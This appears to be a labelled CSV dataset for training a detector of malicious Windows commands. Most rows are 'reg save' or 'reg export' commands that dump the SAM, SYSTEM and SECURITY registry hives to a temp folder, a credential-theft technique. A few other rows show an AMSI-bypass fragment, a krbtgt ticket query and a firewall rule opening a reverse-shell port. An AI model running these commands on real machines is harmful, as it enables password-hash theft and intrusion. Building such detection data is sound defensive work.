text,label
reg export hklm\sam c:\windows\temp\14byupjx.save,1
reg export hklm\system c:\windows\temp\dgcfsg0s.save,1
reg export hklm\security c:\windows\temp\dgrb8v36.save,1
reg save hklm\system c:\windows\temp\sniri66z.save,1
reg save hklm\sam c:\windows\temp\seprsw1d.save,1
reg export hklm\sam c:\windows\temp\2ytwi31l.save,1
reg export hklm\sam c:\windows\temp\3fd6dzyc.save,1
reg  export  hklm\security  c:\windows\temp\s7b4bit0.save,1
reg export hklm\sam c:\windows\temp\mig1myyz.save,1
reg export hklm\security c:\windows\temp\awkvttl6.save,1
reg export hklm\security c:\windows\temp\p5a74jrb.save,1
reg save hklm\security c:\windows\temp\8hohbbda.save,1
reg export hklm\sam c:\windows\temp\u037uob3.save,1
reg export hklm\system c:\windows\temp\2zzj9v2j.save,1
"cmd.exe /c ""backup-utility  write  hklm\software  to  c:\backups\config.dat""",0
reg export hklm\security c:\windows\temp\eoczt9av.save,1
reg export hklm\system c:\windows\temp\c7eqe9nk.save,1
reg export hklm\system c:\windows\temp\8qrqybmc.save,1
reg save hklm\security c:\windows\temp\1z1mf1fq.save,1
reg save hklm\system c:\windows\temp\21es2rxk.save,1
reg export hklm\sam c:\windows\temp\72zhepf5.save,1
reg export hklm\sam c:\windows\temp\lsdmcru4.save,1
reg export hklm\security c:\windows\temp\arteoazs.save,1
reg export hklm\sam c:\windows\temp\pucwi6ey.save,1
reg save hklm\system c:\windows\temp\43fgo4zi.save,1
reg export hklm\sam c:\windows\temp\nns4wt8s.save,1
"cmd.exe /c ""runas  /user:administrator  cmd.exe""",3
reg   export   hklm\system   c:\windows\temp\l35ur8cx.save,1
reg save hklm\sam c:\windows\temp\vx5b3cr8.save,1
reg export hklm\sam c:\windows\temp\eal5lp74.save,1
reg export hklm\sam c:\windows\temp\amyygmev.save,1
reg export hklm\system c:\windows\temp\bn8rbov2.save,1
reg export hklm\security c:\windows\temp\wg7tbdof.save,1
reg save hklm\security c:\windows\temp\mh6pgoo0.save,1
reg export hklm\security c:\windows\temp\bqqodjvm.save,1
reg   save   hklm\system   c:\windows\temp\jxs73xh2.save,1
reg export hklm\security c:\windows\temp\tx1jbyov.save,1
reg export hklm\system c:\windows\temp\elbo3lcv.save,1
reg save hklm\sam c:\windows\temp\tcl3gsac.save,1
reg export hklm\system c:\windows\temp\12tdaus5.save,1
reg export hklm\sam c:\windows\temp\ywricp2t.save,1
reg export hklm\system c:\windows\temp\9ffzgt1i.save,1
reg save hklm\sam c:\windows\temp\w7nx9131.save,1
reg export hklm\system c:\windows\temp\00psgdmq.save,1
reg save hklm\security c:\windows\temp\jfda9ad8.save,1
reg export hklm\security c:\windows\temp\iu8okil2.save,1
reg save hklm\security c:\windows\temp\79ctnr93.save,1
reg save hklm\sam c:\windows\temp\s0y4hefn.save,1
reg save hklm\sam c:\windows\temp\2q9sdmij.save,1
reg save hklm\system c:\windows\temp\urlmho4v.save,1
reg export hklm\sam c:\windows\temp\g92b5t10.save,1
reg export hklm\sam c:\windows\temp\6m25w5am.save,1
reg export hklm\security c:\windows\temp\1xv0x4fb.save,1
reg save hklm\system c:\windows\temp\xab5lneu.save,1
reg save hklm\sam c:\windows\temp\iprv5fxc.save,1
reg save hklm\sam c:\windows\temp\n9t4ctnq.save,1
reg export hklm\sam c:\windows\temp\m4ik4ohn.save,1
reg export hklm\sam c:\windows\temp\nj45wcii.save,1
reg save hklm\security c:\windows\temp\m3cwuklv.save,1
reg save hklm\security c:\windows\temp\rclpymhs.save,1
reg export hklm\sam c:\windows\temp\tapgjb0q.save,1
reg save hklm\system c:\windows\temp\6h9rvflf.save,1
reg  export  hklm\system  c:\windows\temp\xs79jooz.save,1
reg export hklm\security c:\windows\temp\xfms5xsl.save,1
reg save hklm\sam c:\windows\temp\u7hna4nr.save,1
reg export hklm\security c:\windows\temp\0kix6mhq.save,1
reg save hklm\system c:\windows\temp\pctwbu3d.save,1
reg export hklm\sam c:\windows\temp\j4n16cz6.save,1
reg save hklm\system c:\windows\temp\rslykl6r.save,1
reg export hklm\security c:\windows\temp\ui3xag5q.save,1
reg save hklm\sam c:\windows\temp\xkao84r7.save,1
reg export hklm\sam c:\windows\temp\krszezfg.save,1
reg export hklm\system c:\windows\temp\aq4p819y.save,1
reg  export  hklm\security  c:\windows\temp\32s9cnl1.save,1
reg save hklm\sam c:\windows\temp\nazc30ga.save,1
reg save hklm\sam c:\windows\temp\difwhaa3.save,1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\m29drue1.save""",1
reg export hklm\security c:\windows\temp\wqv35qr9.save,1
reg save hklm\sam c:\windows\temp\0hxt90xd.save,1
reg save hklm\sam c:\windows\temp\dsxr7jnu.save,1
reg export hklm\sam c:\windows\temp\pz2gs5cx.save,1
reg save hklm\sam c:\windows\temp\at8thtpx.save,1
reg   save   hklm\sam   c:\windows\temp\n730y706.save,1
reg export hklm\system c:\windows\temp\x6ebobp8.save,1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\8kkmid5j.save""",1
"powershell -nop -c ""klist   get   krbtgt/domain.local""",3
reg save hklm\system c:\windows\temp\rbn3yp4j.save,1
reg save hklm\security c:\windows\temp\q1rpmsbt.save,1
reg export hklm\security c:\windows\temp\0z2364r4.save,1
reg save hklm\sam c:\windows\temp\jqjdkw0c.save,1
reg export hklm\system c:\windows\temp\ib39cilt.save,1
reg save hklm\security c:\windows\temp\ja47uupr.save,1
reg save hklm\security c:\windows\temp\dq1gnvtk.save,1
reg save hklm\security c:\windows\temp\j88p1ont.save,1
reg save hklm\sam c:\windows\temp\fiopkj2m.save,1
reg save hklm\sam c:\windows\temp\l8wuigha.save,1
reg export hklm\sam c:\windows\temp\va9zkegb.save,1
reg save hklm\system c:\windows\temp\qtzwmlvf.save,1
reg export hklm\sam c:\windows\temp\cy9czwj4.save,1
reg export hklm\system c:\windows\temp\r33nieek.save,1
reg save hklm\system c:\windows\temp\wvbkp434.save,1
reg export hklm\security c:\windows\temp\etr38tcr.save,1
reg export hklm\security c:\windows\temp\8ozr3vsh.save,1
reg save hklm\sam c:\windows\temp\z4wl7ghh.save,1
reg save hklm\security c:\windows\temp\u2u1q0im.save,1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\pc15n2bu.save""",1
reg save hklm\sam c:\windows\temp\gjpya5ja.save,1
reg save hklm\security c:\windows\temp\qjiu5bzb.save,1
reg export hklm\sam c:\windows\temp\dp949ykh.save,1
reg export hklm\system c:\windows\temp\0x1i0pw4.save,1
reg export hklm\sam c:\windows\temp\80jzm0hi.save,1
reg  save  hklm\sam  c:\windows\temp\ic4klyct.save,1
reg export hklm\sam c:\windows\temp\qps08f9k.save,1
reg save hklm\security c:\windows\temp\g0qi1t4g.save,1
reg export hklm\sam c:\windows\temp\hjgk28ih.save,1
reg save hklm\system c:\windows\temp\wojf1g1v.save,1
reg save hklm\system c:\windows\temp\37pwlla4.save,1
reg export hklm\security c:\windows\temp\rtvzm5ry.save,1
reg save hklm\security c:\windows\temp\q78gqbss.save,1
reg export hklm\sam c:\windows\temp\nnfqnltw.save,1
reg export hklm\system c:\windows\temp\9m15zaie.save,1
reg save hklm\sam c:\windows\temp\b7737tui.save,1
reg  save  hklm\sam  c:\windows\temp\cnt75kqw.save,1
reg save hklm\sam c:\windows\temp\1q4kipjr.save,1
reg export hklm\security c:\windows\temp\gl0t9ol8.save,1
reg export hklm\sam c:\windows\temp\8rjdxall.save,1
reg export hklm\sam c:\windows\temp\018d3m58.save,1
reg export hklm\sam c:\windows\temp\vx8bkqy7.save,1
reg export hklm\system c:\windows\temp\ru5ljtp7.save,1
reg export hklm\sam c:\windows\temp\zsjbsde3.save,1
reg export hklm\security c:\windows\temp\cbt4n4vd.save,1
reg export hklm\sam c:\windows\temp\3fvb8m81.save,1
reg export hklm\security c:\windows\temp\h3b9lofx.save,1
reg export hklm\sam c:\windows\temp\5cp4t2qg.save,1
reg export hklm\system c:\windows\temp\dw7ini1t.save,1
reg save hklm\sam c:\windows\temp\ijk8zg9v.save,1
reg save hklm\system c:\windows\temp\uco9hrsg.save,1
reg export hklm\security c:\windows\temp\tpk5168p.save,1
reg save hklm\system c:\windows\temp\6w2h7h4n.save,1
reg export hklm\system c:\windows\temp\bjag1pkb.save,1
reg save hklm\sam c:\windows\temp\bv7se0vp.save,1
reg export hklm\sam c:\windows\temp\ei77xbb8.save,1
reg export hklm\system c:\windows\temp\hk4g9gz8.save,1
reg save hklm\sam c:\windows\temp\qita3cs7.save,1
reg export hklm\system c:\windows\temp\crdwkulg.save,1
reg save hklm\security c:\windows\temp\k36dpe5l.save,1
reg export hklm\system c:\windows\temp\z95rux23.save,1
reg export hklm\system c:\windows\temp\pc45plov.save,1
reg save hklm\security c:\windows\temp\hlq89xiv.save,1
reg export hklm\system c:\windows\temp\2xl5nnoj.save,1
reg export hklm\security c:\windows\temp\pv4qfidp.save,1
reg save hklm\security c:\windows\temp\98ubot4j.save,1
reg export hklm\security c:\windows\temp\mjz0c2gk.save,1
reg save hklm\sam c:\windows\temp\qiirmqmj.save,1
reg export hklm\system c:\windows\temp\819um8mv.save,1
reg export hklm\sam c:\windows\temp\6ug7vjmr.save,1
reg save hklm\security c:\windows\temp\1qwyeaap.save,1
reg save hklm\sam c:\windows\temp\yy6lr7jv.save,1
reg save hklm\sam c:\windows\temp\hoiji3sq.save,1
reg export hklm\sam c:\windows\temp\11aqp5fr.save,1
reg save hklm\sam c:\windows\temp\vwuvrdhd.save,1
reg save hklm\system c:\windows\temp\jylh8c8r.save,1
reg save hklm\security c:\windows\temp\t4ri9to4.save,1
reg save hklm\sam c:\windows\temp\hh5kavm3.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\0rmv5vki.save""",1
reg save hklm\sam c:\windows\temp\73dt983r.save,1
reg save hklm\security c:\windows\temp\iao7ufgs.save,1
reg export hklm\security c:\windows\temp\ongyj78m.save,1
reg save hklm\security c:\windows\temp\1wgkq949.save,1
reg save hklm\security c:\windows\temp\gyxjpjyh.save,1
reg save hklm\system c:\windows\temp\4au0kwwt.save,1
reg export hklm\sam c:\windows\temp\w6pm0k02.save,1
reg export hklm\sam c:\windows\temp\4ynpa6d6.save,1
reg save hklm\sam c:\windows\temp\qv5cnovc.save,1
reg export hklm\system c:\windows\temp\umlc49ej.save,1
reg export hklm\sam c:\windows\temp\ionlt3sh.save,1
reg  export  hklm\security  c:\windows\temp\f5963nl4.save,1
reg export hklm\system c:\windows\temp\m1si7ykr.save,1
reg export hklm\security c:\windows\temp\0slnl8iz.save,1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\85addwrt.save""",1
reg export hklm\system c:\windows\temp\6d855cs5.save,1
reg save hklm\security c:\windows\temp\6cvwp72r.save,1
reg export hklm\sam c:\windows\temp\pceptt77.save,1
reg save hklm\system c:\windows\temp\3n6mgf8n.save,1
reg save hklm\security c:\windows\temp\gi4jroy9.save,1
reg export hklm\sam c:\windows\temp\n3xflzxc.save,1
reg save hklm\sam c:\windows\temp\34bca87v.save,1
reg save hklm\sam c:\windows\temp\yjypfb4u.save,1
reg export hklm\security c:\windows\temp\x7jiahni.save,1
reg export hklm\sam c:\windows\temp\bggxdfj7.save,1
reg save hklm\security c:\windows\temp\5cbt7w6a.save,1
reg save hklm\system c:\windows\temp\3mkcxx1q.save,1
reg save hklm\security c:\windows\temp\nd0glbaw.save,1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\45tnc7sm.save""",1
reg save hklm\sam c:\windows\temp\wg60ptyl.save,1
reg export hklm\system c:\windows\temp\0rkwx3fg.save,1
reg   save   hklm\system   c:\windows\temp\bu4ilmzm.save,1
reg save hklm\sam c:\windows\temp\on8xzvpj.save,1
reg save hklm\system c:\windows\temp\uw3u3ngw.save,1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\ftzpzudz.save""",1
reg export hklm\security c:\windows\temp\8ltc8145.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\scbf8hpt.save""",1
reg save hklm\system c:\windows\temp\gy1a62bc.save,1
reg export hklm\system c:\windows\temp\7ozcrkzi.save,1
reg save hklm\system c:\windows\temp\04kdua2a.save,1
reg export hklm\system c:\windows\temp\k2542glu.save,1
reg export hklm\system c:\windows\temp\iru9zrk6.save,1
reg export hklm\security c:\windows\temp\fs0oyqxq.save,1
reg export hklm\system c:\windows\temp\pqam6ufy.save,1
reg export hklm\sam c:\windows\temp\8zfcjk8b.save,1
reg save hklm\sam c:\windows\temp\sttx0ys3.save,1
reg save hklm\security c:\windows\temp\frvupdhn.save,1
reg save hklm\system c:\windows\temp\1exya0sd.save,1
reg export hklm\system c:\windows\temp\gnlz38lg.save,1
reg save hklm\security c:\windows\temp\c072o1fq.save,1
reg export hklm\system c:\windows\temp\74dudzbm.save,1
reg save hklm\system c:\windows\temp\rw559vh9.save,1
reg save hklm\sam c:\windows\temp\0vaws4p0.save,1
reg export hklm\security c:\windows\temp\hsooxgv3.save,1
reg save hklm\sam c:\windows\temp\8vqbu2v0.save,1
reg save hklm\system c:\windows\temp\ug9ap5x5.save,1
reg save hklm\security c:\windows\temp\e1sh2sq5.save,1
reg   save   hklm\system   c:\windows\temp\4ol0e1px.save,1
reg save hklm\security c:\windows\temp\2s30o1ip.save,1
reg save hklm\system c:\windows\temp\lfxumlj7.save,1
reg export hklm\sam c:\windows\temp\86zyw3wr.save,1
reg export hklm\system c:\windows\temp\8afh70vf.save,1
reg export hklm\sam c:\windows\temp\uzezz7gb.save,1
reg export hklm\sam c:\windows\temp\mgrz55si.save,1
reg export hklm\system c:\windows\temp\xvrembbn.save,1
reg export hklm\sam c:\windows\temp\hx65h7qj.save,1
reg save hklm\sam c:\windows\temp\r8gkn4ek.save,1
reg export hklm\system c:\windows\temp\0i8mli6l.save,1
reg save hklm\system c:\windows\temp\sxdhzgfm.save,1
reg save hklm\security c:\windows\temp\os7tq2wy.save,1
reg export hklm\sam c:\windows\temp\vfu55ug4.save,1
reg save hklm\sam c:\windows\temp\g3wk1jar.save,1
reg save hklm\system c:\windows\temp\1y8ektnc.save,1
reg export hklm\sam c:\windows\temp\8q7x3hrh.save,1
reg export hklm\sam c:\windows\temp\fczoszgb.save,1
reg export hklm\security c:\windows\temp\ti20ux9n.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\w3evcy6w.save""",1
reg export hklm\system c:\windows\temp\xip5cppy.save,1
reg export hklm\security c:\windows\temp\knvx2j8h.save,1
reg export hklm\security c:\windows\temp\vgipp1qr.save,1
reg save hklm\system c:\windows\temp\nlqq32w9.save,1
reg save hklm\system c:\windows\temp\6eyz7ir1.save,1
reg save hklm\sam c:\windows\temp\4cohmvz1.save,1
reg export hklm\sam c:\windows\temp\smvgxseq.save,1
reg save hklm\security c:\windows\temp\7hqdf8gf.save,1
reg export hklm\security c:\windows\temp\n0ljnvxt.save,1
reg save hklm\system c:\windows\temp\12ewrtam.save,1
reg export hklm\system c:\windows\temp\l2kwky95.save,1
reg save hklm\sam c:\windows\temp\rjtsqvf6.save,1
reg export hklm\sam c:\windows\temp\91zmpfzy.save,1
reg export hklm\security c:\windows\temp\ykiemciz.save,1
reg save hklm\system c:\windows\temp\p2skze1n.save,1
reg save hklm\system c:\windows\temp\j2b954wn.save,1
reg save hklm\security c:\windows\temp\6i5vwwvg.save,1
reg save hklm\system c:\windows\temp\vq6w6fak.save,1
reg export hklm\system c:\windows\temp\5j0er4j0.save,1
reg save hklm\security c:\windows\temp\dwbqkej1.save,1
reg export hklm\security c:\windows\temp\v942e7gi.save,1
"powershell -nop -c ""whoami   /groups""",0
reg save hklm\security c:\windows\temp\arht8koh.save,1
reg export hklm\sam c:\windows\temp\752uu1vm.save,1
reg save hklm\sam c:\windows\temp\2bd6ij8y.save,1
reg save hklm\system c:\windows\temp\8adikarb.save,1
reg save hklm\security c:\windows\temp\nfsn77av.save,1
reg save hklm\security c:\windows\temp\pxgdorty.save,1
reg export hklm\sam c:\windows\temp\anqvqf2l.save,1
reg export hklm\sam c:\windows\temp\njqejg45.save,1
reg export hklm\system c:\windows\temp\vba66gjv.save,1
reg save hklm\system c:\windows\temp\pa7yr2lg.save,1
reg save hklm\system c:\windows\temp\hpcxs6po.save,1
reg save hklm\system c:\windows\temp\ofl3rzi3.save,1
reg export hklm\sam c:\windows\temp\wjyne6rx.save,1
reg export hklm\sam c:\windows\temp\zdrfvawu.save,1
reg save hklm\system c:\windows\temp\blgnoayv.save,1
reg save hklm\security c:\windows\temp\2bgfiql0.save,1
reg export hklm\security c:\windows\temp\wu6mafs9.save,1
reg export hklm\sam c:\windows\temp\isov6r7l.save,1
reg export hklm\sam c:\windows\temp\1aycbsi8.save,1
reg export hklm\system c:\windows\temp\dg3a6x2p.save,1
reg export hklm\security c:\windows\temp\uvl6ujqr.save,1
reg export hklm\security c:\windows\temp\patkta6m.save,1
reg save hklm\security c:\windows\temp\hwn3k99j.save,1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\h943162q.save""",1
reg save hklm\system c:\windows\temp\7bpt74sm.save,1
reg export hklm\security c:\windows\temp\n2bkk4ks.save,1
reg save hklm\security c:\windows\temp\m70zazfv.save,1
reg save hklm\sam c:\windows\temp\tn48gp6h.save,1
reg save hklm\sam c:\windows\temp\cwhlqa7s.save,1
reg export hklm\security c:\windows\temp\29h44drb.save,1
reg save hklm\security c:\windows\temp\rt39opmu.save,1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.amsiutils')""",3
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\9wkzizjq.save""",1
reg export hklm\system c:\windows\temp\n9zwmm0w.save,1
reg save hklm\security c:\windows\temp\lvvacrg2.save,1
reg export hklm\security c:\windows\temp\tsksnx36.save,1
reg save hklm\sam c:\windows\temp\y5gsgj4y.save,1
reg save hklm\security c:\windows\temp\e2kfecd7.save,1
reg save hklm\sam c:\windows\temp\rt50w73m.save,1
reg save hklm\sam c:\windows\temp\um547dei.save,1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\7mx57fhm.save""",1
reg save hklm\system c:\windows\temp\kdmfa4f8.save,1
reg export hklm\security c:\windows\temp\4yrc0thn.save,1
reg save hklm\sam c:\windows\temp\w71ddjzw.save,1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\a83bbm22.save""",1
reg export hklm\security c:\windows\temp\29fhl45g.save,1
reg save hklm\sam c:\windows\temp\4oig28lh.save,1
reg export hklm\system c:\windows\temp\h634txn6.save,1
reg save hklm\system c:\windows\temp\5nenabqv.save,1
reg   save   hklm\system   c:\windows\temp\ivo1r6xq.save,1
reg export hklm\security c:\windows\temp\9m77k7tc.save,1
reg save hklm\security c:\windows\temp\uwy1748u.save,1
reg export hklm\sam c:\windows\temp\atnhuzhr.save,1
reg save hklm\sam c:\windows\temp\5qdxj8yy.save,1
reg export hklm\system c:\windows\temp\px3nbq6x.save,1
reg save hklm\sam c:\windows\temp\vklqzt5w.save,1
reg save hklm\sam c:\windows\temp\d3wqfeaw.save,1
reg save hklm\sam c:\windows\temp\cq6s61ze.save,1
reg save hklm\sam c:\windows\temp\os0qhgcw.save,1
reg export hklm\security c:\windows\temp\t8dqcuaq.save,1
reg save hklm\security c:\windows\temp\bk6iosvy.save,1
reg export hklm\security c:\windows\temp\pf49hnz9.save,1
reg save hklm\sam c:\windows\temp\hlhrcbgg.save,1
reg   save   hklm\security   c:\windows\temp\ndt9fonj.save,1
reg save hklm\sam c:\windows\temp\au0smh6e.save,1
reg export hklm\system c:\windows\temp\flgzxosm.save,1
reg export hklm\security c:\windows\temp\6lzz0cnv.save,1
reg save hklm\security c:\windows\temp\ryqqhuyw.save,1
reg save hklm\security c:\windows\temp\2ppe6rv5.save,1
reg save hklm\sam c:\windows\temp\hlt89npj.save,1
reg export hklm\system c:\windows\temp\rywdjf30.save,1
reg export hklm\system c:\windows\temp\f9nwimvu.save,1
reg export hklm\security c:\windows\temp\1ewh07zx.save,1
reg export hklm\system c:\windows\temp\7sbdyt44.save,1
reg save hklm\system c:\windows\temp\71p3vwgb.save,1
reg export hklm\security c:\windows\temp\r04kj3jf.save,1
reg save hklm\security c:\windows\temp\xjppfq5o.save,1
reg save hklm\security c:\windows\temp\d6d3urdj.save,1
reg export hklm\sam c:\windows\temp\jzizulwx.save,1
reg save hklm\sam c:\windows\temp\v890lc1n.save,1
reg save hklm\sam c:\windows\temp\j7zphp8e.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\zw6a0pjx.save""",1
reg export hklm\security c:\windows\temp\agi2zaaj.save,1
reg save hklm\sam c:\windows\temp\n4xlnos4.save,1
reg export hklm\security c:\windows\temp\5hhdue55.save,1
reg export hklm\system c:\windows\temp\71tjp8pg.save,1
reg save hklm\system c:\windows\temp\wdz19w7g.save,1
reg save hklm\sam c:\windows\temp\7qj6vpl5.save,1
reg export hklm\sam c:\windows\temp\is095y3f.save,1
reg save hklm\system c:\windows\temp\nucava3v.save,1
reg save hklm\sam c:\windows\temp\i5fncqan.save,1
reg save hklm\security c:\windows\temp\kecxxu8l.save,1
reg save hklm\sam c:\windows\temp\6a6hcu8s.save,1
reg export hklm\security c:\windows\temp\y3218pvb.save,1
reg export hklm\security c:\windows\temp\ssgoyzgq.save,1
reg save hklm\security c:\windows\temp\i6u7yvhi.save,1
reg export hklm\sam c:\windows\temp\f95whnme.save,1
reg export hklm\system c:\windows\temp\x6al8wrr.save,1
reg export hklm\security c:\windows\temp\tvsv91qc.save,1
reg export hklm\sam c:\windows\temp\2hr4xz8v.save,1
reg save hklm\sam c:\windows\temp\t4kr72kn.save,1
reg export hklm\system c:\windows\temp\nfom515w.save,1
reg save hklm\sam c:\windows\temp\rk5oki69.save,1
reg save hklm\system c:\windows\temp\ynxvvh7q.save,1
reg  export  hklm\sam  c:\windows\temp\2voe96nt.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)""",3
reg export hklm\system c:\windows\temp\emha9np5.save,1
reg export hklm\sam c:\windows\temp\mx0feeuf.save,1
reg save hklm\system c:\windows\temp\n0ph0jao.save,1
reg export hklm\system c:\windows\temp\s69642gs.save,1
reg save hklm\sam c:\windows\temp\i1vbzmdf.save,1
reg export hklm\sam c:\windows\temp\w8faweux.save,1
reg export hklm\system c:\windows\temp\niwiy774.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\li9tjdlt.save""",1
reg export hklm\security c:\windows\temp\c8fgl61r.save,1
reg save hklm\security c:\windows\temp\0knestjh.save,1
reg save hklm\system c:\windows\temp\eumi6nb7.save,1
reg export hklm\security c:\windows\temp\0mrlq1q9.save,1
reg export hklm\sam c:\windows\temp\5r76lduo.save,1
reg export hklm\system c:\windows\temp\yerscxt7.save,1
reg export hklm\security c:\windows\temp\jojwewz0.save,1
reg export hklm\system c:\windows\temp\rk3nz392.save,1
reg save hklm\sam c:\windows\temp\57jlp8gt.save,1
reg save hklm\sam c:\windows\temp\omhbdurt.save,1
reg save hklm\sam c:\windows\temp\6bduhwlk.save,1
reg save hklm\security c:\windows\temp\9gqpdb0c.save,1
reg save hklm\system c:\windows\temp\v5yhmgg4.save,1
reg save hklm\system c:\windows\temp\5vxcbqi5.save,1
reg save hklm\security c:\windows\temp\u82qzvtx.save,1
reg export hklm\security c:\windows\temp\xl5ww793.save,1
reg export hklm\sam c:\windows\temp\iwzfon8u.save,1
reg save hklm\security c:\windows\temp\c03xi9nr.save,1
reg export hklm\security c:\windows\temp\z10pkizt.save,1
reg export hklm\system c:\windows\temp\iluttur0.save,1
reg export hklm\system c:\windows\temp\ojq135l6.save,1
reg export hklm\sam c:\windows\temp\rczkunyf.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\jw5ip3hq.save""",1
reg export hklm\system c:\windows\temp\z0vr4bj3.save,1
reg export hklm\system c:\windows\temp\2971p3yb.save,1
reg save hklm\security c:\windows\temp\zz3g2cws.save,1
reg export hklm\security c:\windows\temp\y8gz35dy.save,1
reg export hklm\system c:\windows\temp\xd2d4xym.save,1
reg save hklm\security c:\windows\temp\s8c48ikh.save,1
reg save hklm\security c:\windows\temp\zl827saq.save,1
reg export hklm\system c:\windows\temp\n4k2mep0.save,1
reg save hklm\system c:\windows\temp\v1jsxqoc.save,1
reg save hklm\system c:\windows\temp\2wkjhj0c.save,1
powershell  get-process,0
reg export hklm\sam c:\windows\temp\ytd1mp61.save,1
reg save hklm\security c:\windows\temp\28w5wluc.save,1
reg save hklm\sam c:\windows\temp\seacx9q7.save,1
reg save hklm\system c:\windows\temp\385730nu.save,1
reg save hklm\sam c:\windows\temp\4sktvscr.save,1
reg save hklm\sam c:\windows\temp\f7kvrbl4.save,1
reg export hklm\system c:\windows\temp\wj469t06.save,1
reg export hklm\security c:\windows\temp\crlgjd47.save,1
reg export hklm\security c:\windows\temp\7ume23re.save,1
reg export hklm\system c:\windows\temp\p2hm92fg.save,1
reg save hklm\system c:\windows\temp\47za8k31.save,1
reg save hklm\security c:\windows\temp\5k9owxiq.save,1
rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"powershell -nop -c ""reg save hklm\security c:\windows\temp\1uav803q.save""",1
reg export hklm\system c:\windows\temp\o9pkp7y4.save,1
reg export hklm\system c:\windows\temp\zdqya66l.save,1
reg save hklm\system c:\windows\temp\kwqfwa9i.save,1
reg export hklm\system c:\windows\temp\msdh3kg2.save,1
reg save hklm\security c:\windows\temp\eo6npdas.save,1
reg export hklm\sam c:\windows\temp\mo6745qn.save,1
reg save hklm\system c:\windows\temp\8rbjp3xq.save,1
reg export hklm\system c:\windows\temp\7fvtd1w2.save,1
reg export hklm\sam c:\windows\temp\cvad8blv.save,1
reg  save  hklm\security  c:\windows\temp\wmug8l8l.save,1
reg save hklm\system c:\windows\temp\acxpf0c1.save,1
reg export hklm\system c:\windows\temp\f1on0h3d.save,1
reg save hklm\sam c:\windows\temp\5kkcwcvb.save,1
reg export hklm\system c:\windows\temp\ldkwt54s.save,1
reg save hklm\sam c:\windows\temp\am7zkcrp.save,1
reg save hklm\sam c:\windows\temp\5ugxnspc.save,1
reg save hklm\sam c:\windows\temp\diu0zrs8.save,1
reg  save  hklm\system  c:\windows\temp\7nhmxh5w.save,1
reg save hklm\sam c:\windows\temp\08bkx9cv.save,1
reg save hklm\sam c:\windows\temp\iw6cvquc.save,1
reg export hklm\sam c:\windows\temp\9nkscoam.save,1
reg save hklm\security c:\windows\temp\dcovd4av.save,1
reg export hklm\system c:\windows\temp\lgn3ri1s.save,1
reg export hklm\security c:\windows\temp\oz7wxsih.save,1
reg export hklm\system c:\windows\temp\eqfa60l9.save,1
reg save hklm\sam c:\windows\temp\csf1db9c.save,1
reg save hklm\sam c:\windows\temp\ogmra8qa.save,1
reg save hklm\system c:\windows\temp\tjchlfid.save,1
reg save hklm\security c:\windows\temp\ctasp1o2.save,1
reg save hklm\security c:\windows\temp\j2g8y7hc.save,1
reg export hklm\system c:\windows\temp\l1dviyuj.save,1
reg save hklm\system c:\windows\temp\iyug7frt.save,1
reg save hklm\system c:\windows\temp\ia0q8ebr.save,1
reg save hklm\system c:\windows\temp\ugj3ccwr.save,1
reg save hklm\system c:\windows\temp\n06x7w9b.save,1
reg export hklm\security c:\windows\temp\inny850x.save,1
reg export hklm\security c:\windows\temp\yiz02mph.save,1
reg save hklm\sam c:\windows\temp\a0gth1uo.save,1
reg save hklm\security c:\windows\temp\6ebww0lt.save,1
reg save hklm\system c:\windows\temp\1z2tk6oc.save,1
reg save hklm\system c:\windows\temp\ff6stas3.save,1
reg export hklm\security c:\windows\temp\21p9alr8.save,1
reg save hklm\sam c:\windows\temp\5w0kk8qn.save,1
